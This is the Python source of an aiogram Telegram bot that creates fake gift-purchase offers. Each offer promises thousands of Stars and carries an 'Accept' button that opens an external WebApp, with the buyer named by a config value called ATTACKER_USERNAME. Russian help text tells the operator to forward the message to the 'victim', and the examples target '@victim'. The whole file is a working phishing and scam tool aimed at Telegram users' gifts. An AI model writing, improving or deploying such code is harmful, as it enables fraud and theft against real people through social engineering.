import asyncio
import logging
import json
import os
from urllib.parse import quote
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    WebAppInfo,
)
from aiogram.enums import ParseMode

import config

logging.basicConfig(level=logging.INFO)
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

TEMPLATES_FILE = Path("templates.json")

# Default templates
DEFAULT_TEMPLATES = {
    "icecream": {
        "gift_name": "Ice Cream #201001",
        "stars": 7000,
        "image": "https://cdn.changes.tg/gifts/models/Ice%20Cream/png/Original.png",
        "expiry": "5h 59m"
    },
    "heart": {
        "gift_name": "Heart",
        "stars": 5000,
        "image": "https://cdn.changes.tg/gifts/models/Heart/png/Original.png",
        "expiry": "12h"
    }
}


def load_templates() -> dict:
    if TEMPLATES_FILE.exists():
        try:
            return json.loads(TEMPLATES_FILE.read_text(encoding="utf-8"))
        except Exception:
            pass
    return DEFAULT_TEMPLATES.copy()


def save_templates(templates: dict):
    TEMPLATES_FILE.write_text(json.dumps(templates, ensure_ascii=False, indent=2), encoding="utf-8")


templates = load_templates()
current_default = "icecream"


def is_admin(user_id: int) -> bool:
    return user_id in config.ADMIN_IDS


def build_webapp_url(gift_name: str, stars: int, buyer: str, image: str = "") -> str:
    params = (
        f"?gift={quote(gift_name)}"
        f"&stars={stars}"
        f"&buyer={quote(buyer)}"
    )
    if image:
        params += f"&img={quote(image)}"
    return config.WEBAPP_URL.rstrip("/") + params


def build_offer_keyboard(gift_name: str, stars: int, image: str = "") -> InlineKeyboardMarkup:
    url = build_webapp_url(gift_name, stars, config.ATTACKER_USERNAME, image)
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✓ Accept", web_app=WebAppInfo(url=url)),
            InlineKeyboardButton(text="✗ Decline", callback_data="decline_offer")
        ]
    ])


def build_offer_text(gift_name: str, stars: int, buyer: str, expiry: str) -> str:
    return (
        f"<b>User {buyer} is offering you\n"
        f"{stars} Stars for the gift {gift_name}.</b>\n\n"
        f"This offer expires in <b>{expiry}</b>."
    )


@dp.message(Command("start"))
async def cmd_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("Access denied.")
        return

    text = (
        "<b>Gift Offer Bot</b>\n\n"
        "Команды:\n"
        "/offer @user [шаблон]\n"
        "/templates — список шаблонов\n"
        "/newtemplate имя подарок звезды [картинка] [время]\n"
        "/setdefault имя — сделать шаблон по умолчанию\n"
        "/deltemplate имя\n\n"
        f"Текущий default: <code>{current_default}</code>\n"
        f"Attacker: <code>@{config.ATTACKER_USERNAME}</code>"
    )
    await message.answer(text, parse_mode=ParseMode.HTML)


@dp.message(Command("templates"))
async def cmd_templates(message: Message):
    if not is_admin(message.from_user.id):
        return
    if not templates:
        await message.answer("Шаблонов нет.")
        return
    lines = ["<b>Шаблоны:</b>\n"]
    for name, t in templates.items():
        mark = " ← default" if name == current_default else ""
        lines.append(
            f"• <code>{name}</code>{mark}\n"
            f"  {t['gift_name']} — {t['stars']} Stars\n"
            f"  expires: {t.get('expiry', '5h 59m')}"
        )
    await message.answer("\n".join(lines), parse_mode=ParseMode.HTML)


@dp.message(Command("newtemplate"))
async def cmd_newtemplate(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer(
            "Формат:\n"
            "<code>/newtemplate имя подарок звезды [картинка] [время]</code>\n\n"
            "Пример:\n"
            "<code>/newtemplate rare \"Rare Gift #123\" 15000</code>\n"
            "<code>/newtemplate icecream2 Ice Cream 9000 https://... 3h</code>",
            parse_mode=ParseMode.HTML
        )
        return

    parts = command.args.split()
    if len(parts) < 3:
        await message.answer("Минимум: имя, название подарка, звёзды")
        return

    name = parts[0].lower()
    try:
        stars = int(parts[-1]) if parts[-1].isdigit() else int(parts[2])
        # smarter parse
        if parts[-1].isdigit() and len(parts) >= 3:
            stars = int(parts[-1])
            gift_parts = parts[1:-1]
            image = ""
            expiry = "5h 59m"
            # if last of gift_parts looks like url
            if gift_parts and gift_parts[-1].startswith("http"):
                image = gift_parts[-1]
                gift_parts = gift_parts[:-1]
            gift_name = " ".join(gift_parts)
        else:
            stars = int(parts[2])
            gift_name = parts[1]
            image = parts[3] if len(parts) > 3 and parts[3].startswith("http") else ""
            expiry = parts[4] if len(parts) > 4 else "5h 59m"
    except Exception:
        await message.answer("Не смог разобрать. Пример:\n<code>/newtemplate mygift Ice Cream #1 7000</code>", parse_mode=ParseMode.HTML)
        return

    if not gift_name:
        gift_name = "Gift"

    templates[name] = {
        "gift_name": gift_name,
        "stars": stars,
        "image": image or config.DEFAULT_GIFT_IMAGE,
        "expiry": expiry if 'expiry' in locals() else "5h 59m"
    }
    save_templates(templates)
    await message.answer(f"Шаблон <code>{name}</code> сохранён.\n{gift_name} — {stars} Stars", parse_mode=ParseMode.HTML)


@dp.message(Command("setdefault"))
async def cmd_setdefault(message: Message, command: CommandObject):
    global current_default
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer("Укажи имя: /setdefault icecream")
        return
    name = command.args.strip().lower()
    if name not in templates:
        await message.answer(f"Шаблон <code>{name}</code> не найден.", parse_mode=ParseMode.HTML)
        return
    current_default = name
    await message.answer(f"Default шаблон: <code>{name}</code>", parse_mode=ParseMode.HTML)


@dp.message(Command("deltemplate"))
async def cmd_deltemplate(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        return
    if not command.args:
        await message.answer("Укажи имя: /deltemplate name")
        return
    name = command.args.strip().lower()
    if name in templates:
        del templates[name]
        save_templates(templates)
        await message.answer(f"Удалён: <code>{name}</code>", parse_mode=ParseMode.HTML)
    else:
        await message.answer("Не найден.")


@dp.message(Command("offer"))
async def cmd_offer(message: Message, command: CommandObject):
    if not is_admin(message.from_user.id):
        await message.answer("Access denied.")
        return

    if not command.args:
        await message.answer(
            "Формат:\n"
            "<code>/offer @username [шаблон]</code>\n\n"
            "Примеры:\n"
            "<code>/offer @victim</code>\n"
            "<code>/offer @victim icecream</code>\n"
            "<code>/offer @victim heart</code>",
            parse_mode=ParseMode.HTML
        )
        return

    parts = command.args.split()
    target = parts[0].lstrip("@")
    template_name = parts[1].lower() if len(parts) > 1 else current_default

    if template_name not in templates:
        # try to parse as custom inline: gift stars
        await message.answer(f"Шаблон <code>{template_name}</code> не найден. Используй /templates", parse_mode=ParseMode.HTML)
        return

    t = templates[template_name]
    gift_name = t["gift_name"]
    stars = t["stars"]
    image = t.get("image", "")
    expiry = t.get("expiry", "5h 59m")

    text = build_offer_text(gift_name, stars, config.ATTACKER_USERNAME, expiry)
    kb = build_offer_keyboard(gift_name, stars, image)

    await message.answer(
        f"<b>Превью для @{target}</b>\n"
        f"Шаблон: <code>{template_name}</code>\n"
        f"Подарок: <code>{gift_name}</code>\n"
        f"Stars: <code>{stars}</code>\n\n"
        "Перешли сообщение ниже жертве.",
        parse_mode=ParseMode.HTML
    )

    await message.answer(text, reply_markup=kb, parse_mode=ParseMode.HTML)

    if image:
        try:
            await message.answer_photo(photo=image, caption=f"<b>{gift_name}</b>", parse_mode=ParseMode.HTML)
        except Exception:
            pass


@dp.callback_query(F.data == "decline_offer")
async def on_decline(callback: CallbackQuery):
    await callback.message.edit_text("Offer declined.")
    await callback.answer()


@dp.message(F.web_app_data)
async def on_webapp_data(message: Message):
    if not is_admin(message.from_user.id):
        return
    data = message.web_app_data.data
    await message.answer(f"<b>WebApp event</b>\n<code>{data}</code>", parse_mode=ParseMode.HTML)


async def main():
    print("Bot started. Templates loaded:", list(templates.keys()))
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
